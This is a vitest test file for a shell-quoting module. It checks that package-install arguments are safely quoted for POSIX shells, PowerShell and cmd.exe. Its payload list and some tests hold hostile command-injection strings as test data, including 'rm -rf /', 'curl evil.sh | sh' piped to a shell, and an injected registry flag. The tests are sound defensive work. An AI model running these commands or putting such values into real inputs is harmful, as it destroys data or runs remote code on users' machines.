/**
 * Shell quoting.
 *
 * This is the layer that has to hold when everything above it fails, so it is
 * tested against the payloads that would actually be used rather than against
 * "does it add quotes". Every case here is a string that executes something if
 * the quoting is wrong for the shell it lands in.
 */

import { describe, expect, it } from 'vitest';
import {
  buildCommandLine,
  detectShell,
  quoteArgument,
} from '../../src/ui/quoting.js';

/**
 * Payloads that run code, exfiltrate, or corrupt the command if unquoted.
 *
 * These are shell syntax, not JavaScript template literals — `${IFS}` is a
 * word-splitting trick, and writing it as a template string would defeat the
 * point of the test.
 */
const HOSTILE = [
  'a; rm -rf /',
  'a && curl evil.sh | sh',
  'a`whoami`',
  'a$(whoami)',
  // biome-ignore lint/suspicious/noTemplateCurlyInString: shell syntax, not JS
  'a${IFS}b',
  "a'; rm -rf /; '",
  'a"; rm -rf /; "',
  'a | tee /etc/passwd',
  'a\nrm -rf /',
  'a > out.txt',
  '%PATH%',
  '%USERPROFILE%',
  'a & calc.exe',
  'a^b',
  '$env:PATH',
  '@(1,2)',
  '1.0.0,--registry=http://evil',
  '1.0.0;calc.exe',
];

describe('detectShell', () => {
  it('recognises the PowerShell family', () => {
    expect(detectShell('C:\\Windows\\System32\\powershell.exe')).toBe(
      'powershell',
    );
    expect(detectShell('C:\\Program Files\\PowerShell\\7\\pwsh.exe')).toBe(
      'powershell',
    );
    expect(detectShell('/usr/local/bin/pwsh')).toBe('powershell');
  });

  it('recognises cmd.exe', () => {
    expect(detectShell('C:\\Windows\\System32\\cmd.exe')).toBe('cmd');
  });

  it('recognises POSIX shells, including Git Bash on Windows', () => {
    expect(detectShell('/bin/bash')).toBe('posix');
    expect(detectShell('/bin/zsh')).toBe('posix');
    expect(detectShell('/usr/bin/fish')).toBe('posix');
    expect(detectShell('C:\\Program Files\\Git\\bin\\bash.exe')).toBe('posix');
  });

  it('falls back to the platform default when the shell is unknown', () => {
    // PowerShell is the conservative default: its rules are the strictest, so
    // quoting for it is never *unsafe* in another shell, only uglier.
    expect(detectShell(undefined, 'win32')).toBe('powershell');
    expect(detectShell('', 'win32')).toBe('powershell');
    expect(detectShell(undefined, 'darwin')).toBe('posix');
    expect(detectShell('/opt/weird/shell', 'linux')).toBe('posix');
  });
});

describe('quoteArgument', () => {
  it('leaves ordinary package specs unquoted and readable', () => {
    for (const shell of ['posix', 'powershell', 'cmd'] as const) {
      expect(quoteArgument('react', shell)).toBe('react');
      expect(quoteArgument('@scope/pkg@1.2.3', shell)).toBe('@scope/pkg@1.2.3');
      expect(quoteArgument('--save-dev', shell)).toBe('--save-dev');
      expect(quoteArgument('org.junit:junit-jupiter', shell)).toBe(
        'org.junit:junit-jupiter',
      );
    }
  });

  describe('POSIX', () => {
    it('wraps hostile input in single quotes, which disable all expansion', () => {
      for (const payload of HOSTILE) {
        const quoted = quoteArgument(payload, 'posix');
        expect(quoted.startsWith("'")).toBe(true);
        expect(quoted.endsWith("'")).toBe(true);
      }
    });

    it('closes and reopens around an embedded single quote', () => {
      // The only way out of a POSIX single-quoted string.
      expect(quoteArgument("a'b", 'posix')).toBe(`'a'\\''b'`);
    });

    it('never leaves an unbalanced quote', () => {
      for (const payload of HOSTILE) {
        const quoted = quoteArgument(payload, 'posix');
        // Strip the escaped form, then the count of remaining quotes must be even.
        const remaining = quoted.split(`'\\''`).join('');
        expect([...remaining].filter((c) => c === "'").length % 2).toBe(0);
      }
    });
  });

  describe('PowerShell', () => {
    it('uses single quotes, not double', () => {
      // Double quotes are not an escape in PowerShell: "$(whoami)" executes.
      for (const payload of HOSTILE) {
        const quoted = quoteArgument(payload, 'powershell');
        expect(quoted.startsWith("'")).toBe(true);
        expect(quoted.endsWith("'")).toBe(true);
      }
    });

    it('renders subexpressions and variables inert', () => {
      expect(quoteArgument('a$(whoami)', 'powershell')).toBe("'a$(whoami)'");
      expect(quoteArgument('$env:PATH', 'powershell')).toBe("'$env:PATH'");
    });

    it('doubles an embedded single quote', () => {
      expect(quoteArgument("a'b", 'powershell')).toBe("'a''b'");
      // A payload that tries to close the string and append a command ends up
      // entirely inside it.
      expect(quoteArgument("'; rm -rf /; '", 'powershell')).toBe(
        "'''; rm -rf /; '''",
      );
    });
  });

  describe('cmd.exe', () => {
    it('refuses percent signs, which quoting cannot neutralise', () => {
      // cmd expands %VAR% inside double quotes and offers no escape for it.
      // These used to be stripped, which protected the shell by silently
      // changing the argument; refusing protects it without lying.
      expect(() => quoteArgument('%PATH%', 'cmd')).toThrow(/cmd\.exe/i);
      expect(() => quoteArgument('a%USERPROFILE%b', 'cmd')).toThrow();
    });

    it('contains separators and redirections inside the quoted string', () => {
      for (const payload of ['a & calc.exe', 'a | more', 'a > out.txt']) {
        const quoted = quoteArgument(payload, 'cmd');
        expect(quoted.startsWith('"')).toBe(true);
        expect(quoted.endsWith('"')).toBe(true);
      }
    });

    it('doubles trailing backslashes so they cannot escape the closing quote', () => {
      expect(quoteArgument('a b\\', 'cmd')).toBe('"a b\\\\"');
    });

    it('doubles an embedded double quote', () => {
      expect(quoteArgument('a"b', 'cmd')).toBe('"a""b"');
    });

    it('quotes commas, semicolons and equals signs rather than leaving them bare', () => {
      // Unquoted, these are argument delimiters to a .cmd/.bat wrapper's own
      // %1/%* parsing (npm/yarn/pnpm on Windows), letting one argv element
      // split into several. Quoting keeps the whole thing one token.
      for (const payload of [
        '1.0.0,--registry=http://evil',
        '1.0.0;calc.exe',
        'a=b',
      ]) {
        const quoted = quoteArgument(payload, 'cmd');
        expect(quoted).toBe(`"${payload}"`);
      }
    });

    it('refuses exclamation marks, which delayed expansion treats like percent signs', () => {
      expect(() => quoteArgument('a!USERPROFILE!b', 'cmd')).toThrow();
    });
  });
});

describe('buildCommandLine', () => {
  it('joins argv with each element quoted for the target shell', () => {
    expect(buildCommandLine(['npm', 'install', 'react@18.2.0'], 'posix')).toBe(
      'npm install react@18.2.0',
    );
  });

  it('keeps an injected version from escaping its argument', () => {
    const line = buildCommandLine(
      ['npm', 'install', 'react@$(curl evil.sh|sh)'],
      'powershell',
    );
    // Everything hostile is inside one quoted token; the command is still
    // three words followed by a literal.
    expect(line).toBe("npm install 'react@$(curl evil.sh|sh)'");
  });
});

describe('backslash is never left unquoted', () => {
  /*
   * A backslash used to sit in the "safe, needs no quoting" set. In a POSIX
   * shell it is the escape character, so an unquoted one is not inert: it
   * silently rewrites the argument, and a trailing one turns the command into a
   * line continuation that swallows whatever is typed next.
   *
   * Provider validation rejects these today. This module's whole premise is
   * that it holds anyway.
   */
  const withBackslash = ['a\\b', 'a\\', '\\', 'C:\\Users\\dev', 'a\\nb'];

  it.each(withBackslash)('quotes %j for posix', (argument) => {
    const quoted = quoteArgument(argument, 'posix');
    expect(quoted.startsWith("'")).toBe(true);
    expect(quoted.endsWith("'")).toBe(true);
  });

  it.each(withBackslash)('quotes %j for powershell', (argument) => {
    const quoted = quoteArgument(argument, 'powershell');
    expect(quoted.startsWith("'")).toBe(true);
  });

  it('cannot leave a command line ending in a continuation', () => {
    const line = buildCommandLine(['npm', 'install', 'pkg@1.0.0\\'], 'posix');
    expect(line.endsWith('\\')).toBe(false);
  });
});

describe('characters cmd.exe cannot be protected from', () => {
  /*
   * `%VAR%` expands inside double quotes and there is no escape for it; `!VAR!`
   * is the same story under delayed expansion. Stripping them kept the command
   * safe but silently changed what was asked for — a PEP 440 epoch version
   * `1!2.0.0` installed as `12.0.0`, a different release entirely, with nothing
   * said. Refusing is the honest form of the same protection.
   */
  it('refuses an argument containing a percent sign', () => {
    expect(() => quoteArgument('100%pure', 'cmd')).toThrow(/cmd\.exe/i);
  });

  it('refuses a PEP 440 epoch version rather than silently rewriting it', () => {
    expect(() => quoteArgument('1!2.0.0', 'cmd')).toThrow(/1!2\.0\.0/);
  });

  it('still quotes them safely for the other two shells', () => {
    for (const shell of ['posix', 'powershell'] as const) {
      expect(() => quoteArgument('1!2.0.0', shell)).not.toThrow();
      expect(quoteArgument('1!2.0.0', shell)).toContain('1!2.0.0');
    }
  });

  it('fails the whole command line rather than running a rewritten one', () => {
    expect(() =>
      buildCommandLine(['pip', 'install', 'x==1!2.0'], 'cmd'),
    ).toThrow();
  });
});
